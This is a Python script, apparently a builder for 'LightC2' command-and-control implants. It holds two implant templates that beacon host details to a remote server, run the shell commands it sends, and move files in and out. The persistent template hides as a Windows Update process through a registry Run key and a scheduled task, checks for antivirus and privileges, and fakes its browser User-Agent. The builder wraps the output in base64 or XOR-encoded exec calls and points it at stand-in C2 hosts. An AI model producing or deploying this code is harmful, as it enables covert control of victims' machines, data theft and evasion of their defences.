#!/usr/bin/env python3
"""
LightC2 Implant Generator
Generates custom implants for the LightC2 command and control framework
"""

import os
import json
import base64
import random
import string
from datetime import datetime

class LightC2ImplantGenerator:
    def __init__(self):
        self.templates = self.load_templates()
        self.obfuscation_methods = [
            "base64_encoding",
            "xor_encryption", 
            "string_reversal",
            "character_substitution",
            "gzip_compression"
        ]
    
    def load_templates(self):
        """Load implant templates"""
        basic_implant_template = '''import requests
import time
import subprocess
import platform
import os
from threading import Thread

class LightC2Implant:
    def __init__(self, c2_server, implant_id):
        self.c2_server = c2_server
        self.implant_id = implant_id
        self.beacon_interval = 60  # seconds
        self.running = True
    
    def beacon(self):
        """Send beacon to C2 server"""
        system_info = {
            'implant_id': self.implant_id,
            'hostname': platform.node(),
            'os': platform.system(),
            'architecture': platform.architecture()[0],
            'user': os.getlogin(),
            'timestamp': time.time()
        }
        
        try:
            response = requests.post(
                f"{self.c2_server}/beacon",
                json=system_info,
                timeout=10
            )
            return response.json()
        except:
            return None
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=30
            )
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except Exception as e:
            return {'error': str(e)}
    
    def download_file(self, url, local_path):
        """Download file from URL"""
        try:
            response = requests.get(url, stream=True)
            with open(local_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            return True
        except:
            return False
    
    def upload_file(self, file_path, upload_url):
        """Upload file to C2 server"""
        try:
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f)}
                response = requests.post(upload_url, files=files)
            return response.status_code == 200
        except:
            return False
    
    def main_loop(self):
        """Main implant loop"""
        while self.running:
            try:
                # Send beacon and get commands
                commands = self.beacon()
                
                if commands and 'tasks' in commands:
                    for task in commands['tasks']:
                        if task['type'] == 'execute':
                            result = self.execute_command(task['command'])
                            # Send result back to C2
                            requests.post(
                                f"{self.c2_server}/result",
                                json={
                                    'implant_id': self.implant_id,
                                    'task_id': task['id'],
                                    'result': result
                                }
                            )
                        elif task['type'] == 'download':
                            self.download_file(task['url'], task['local_path'])
                        elif task['type'] == 'upload':
                            self.upload_file(task['file_path'], task['upload_url'])
                
                time.sleep(self.beacon_interval)
                
            except Exception as e:
                time.sleep(self.beacon_interval)

if __name__ == "__main__":
    # Configuration
    C2_SERVER = "{c2_server}"
    IMPLANT_ID = "{implant_id}"
    
    implant = LightC2Implant(C2_SERVER, IMPLANT_ID)
    implant.main_loop()'''

        persistent_implant_template = '''# Persistent LightC2 Implant with multiple persistence mechanisms
import os
import sys
import requests
import time
import subprocess
import platform
import winreg  # Windows registry for persistence
from threading import Thread

class PersistentLightC2Implant:
    def __init__(self, c2_server, implant_id):
        self.c2_server = c2_server
        self.implant_id = implant_id
        self.beacon_interval = 300  # 5 minutes
        self.install_path = os.path.join(os.getenv('APPDATA'), 'WindowsUpdate', 'wuauclt.exe')
    
    def install_persistence(self):
        """Install multiple persistence mechanisms"""
        if platform.system() == 'Windows':
            # Registry run key
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(key)
            except:
                pass
            
            # Scheduled task
            try:
                task_cmd = f'schtasks /create /tn "Microsoft\\Windows\\WindowsUpdate" /tr "{sys.executable}" /sc hourly /f'
                subprocess.run(task_cmd, shell=True, capture_output=True)
            except:
                pass
        
        # Copy to install path
        try:
            if not os.path.exists(self.install_path):
                os.makedirs(os.path.dirname(self.install_path), exist_ok=True)
                # In real scenario, would copy the executable
                with open(self.install_path, 'w') as f:
                    f.write('#' + '\n'.join(sys.argv))
        except:
            pass
    
    def beacon(self):
        """Enhanced beacon with system profiling"""
        system_info = {
            'implant_id': self.implant_id,
            'hostname': platform.node(),
            'os': platform.system(),
            'version': platform.version(),
            'architecture': platform.architecture()[0],
            'processor': platform.processor(),
            'user': os.getenv('USERNAME') or os.getenv('USER'),
            'privileges': self.check_privileges(),
            'antivirus': self.detect_av(),
            'network_info': self.get_network_info(),
            'timestamp': time.time()
        }
        
        try:
            response = requests.post(
                f"{self.c2_server}/beacon",
                json=system_info,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                timeout=15
            )
            return response.json() if response.status_code == 200 else None
        except:
            return None
    
    def check_privileges(self):
        """Check if running with elevated privileges"""
        try:
            if platform.system() == 'Windows':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def detect_av(self):
        """Detect antivirus software"""
        av_products = []
        
        if platform.system() == 'Windows':
            # Check common AV processes
            av_processes = [
                'msmpeng.exe', 'nod32krn.exe', 'avp.exe', 
                'bdagent.exe', 'avguard.exe', 'spideragent.exe'
            ]
            
            try:
                output = subprocess.check_output('tasklist', shell=True).decode().lower()
                for proc in av_processes:
                    if proc in output:
                        av_products.append(proc)
            except:
                pass
        
        return av_products
    
    def get_network_info(self):
        """Gather network information"""
        network_info = {}
        
        try:
            # Get IP addresses
            if platform.system() == 'Windows':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                network_info['ipconfig'] = result.stdout
            else:
                result = subprocess.run(['ifconfig'], capture_output=True, text=True)
                network_info['ifconfig'] = result.stdout
        except:
            pass
        
        return network_info
    
    def main_loop(self):
        """Main implant loop with error handling"""
        self.install_persistence()
        
        error_count = 0
        max_errors = 5
        
        while error_count < max_errors:
            try:
                commands = self.beacon()
                
                if commands:
                    # Process commands from C2
                    self.process_commands(commands)
                    error_count = 0  # Reset error count on success
                else:
                    error_count += 1
                
                time.sleep(self.beacon_interval)
                
            except Exception as e:
                error_count += 1
                time.sleep(min(300, self.beacon_interval * 2))  # Backoff on errors

if __name__ == "__main__":
    C2_SERVER = "{c2_server}"
    IMPLANT_ID = "{implant_id}"
    
    implant = PersistentLightC2Implant(C2_SERVER, IMPLANT_ID)
    implant.main_loop()'''

        return {
            "basic_implant": basic_implant_template,
            "persistent_implant": persistent_implant_template
        }
    
    def generate_implant_id(self):
        """Generate unique implant ID"""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"implant_{timestamp}_{random_suffix}"
    
    def obfuscate_code(self, code, method="base64_encoding"):
        """Obfuscate implant code"""
        if method == "base64_encoding":
            encoded = base64.b64encode(code.encode()).decode()
            return f"exec(__import__('base64').b64decode('{encoded}'))"
        elif method == "xor_encryption":
            # Simple XOR encryption
            key = 0x42
            encrypted = ''.join(chr(ord(c) ^ key) for c in code)
            encoded = base64.b64encode(encrypted.encode()).decode()
            return f"exec(''.join(chr(ord(c)^{key}) for c in __import__('base64').b64decode('{encoded}').decode()))"
        else:
            return code
    
    def generate_implant(self, template_name="basic_implant", c2_server="http://c2.example.com", 
                        obfuscate=False, obfuscation_method="base64_encoding"):
        """Generate a LightC2 implant"""
        
        if template_name not in self.templates:
            raise ValueError(f"Unknown template: {template_name}")
        
        implant_id = self.generate_implant_id()
        
        # Generate the implant code
        template_code = self.templates[template_name]
        implant_code = template_code.replace("{c2_server}", c2_server).replace("{implant_id}", implant_id)
        
        # Obfuscate if requested
        if obfuscate:
            implant_code = self.obfuscate_code(implant_code, obfuscation_method)
        
        return {
            "implant_id": implant_id,
            "template": template_name,
            "c2_server": c2_server,
            "code": implant_code,
            "obfuscated": obfuscate,
            "obfuscation_method": obfuscation_method if obfuscate else None,
            "generated_at": datetime.now().isoformat()
        }
    
    def save_implant(self, implant_data, output_dir="payloads/tools/lightc2"):
        """Save implant to file"""
        os.makedirs(output_dir, exist_ok=True)
        
        filename = f"{implant_data['implant_id']}.py"
        filepath = os.path.join(output_dir, filename)
        
        with open(filepath, 'w') as f:
            f.write(implant_data['code'])
        
        # Save metadata
        metadata_file = os.path.join(output_dir, f"{implant_data['implant_id']}_metadata.json")
        with open(metadata_file, 'w') as f:
            json.dump({k: v for k, v in implant_data.items() if k != 'code'}, f, indent=2)
        
        return filepath

def main():
    """Generate sample LightC2 implants"""
    generator = LightC2ImplantGenerator()
    
    print("Generating LightC2 implants...")
    
    # Generate basic implant
    basic_implant = generator.generate_implant(
        template_name="basic_implant",
        c2_server="http://malicious-c2-server.com",
        obfuscate=False
    )
    basic_path = generator.save_implant(basic_implant)
    print(f"Basic implant: {basic_path}")
    
    # Generate persistent implant
    persistent_implant = generator.generate_implant(
        template_name="persistent_implant", 
        c2_server="https://legitimate-cdn.com/api",
        obfuscate=True,
        obfuscation_method="base64_encoding"
    )
    persistent_path = generator.save_implant(persistent_implant)
    print(f"Persistent implant: {persistent_path}")
    
    print("\nLightC2 implants generated successfully!")
    print("Use with the LightC2 command and control framework.")

if __name__ == "__main__":
    main()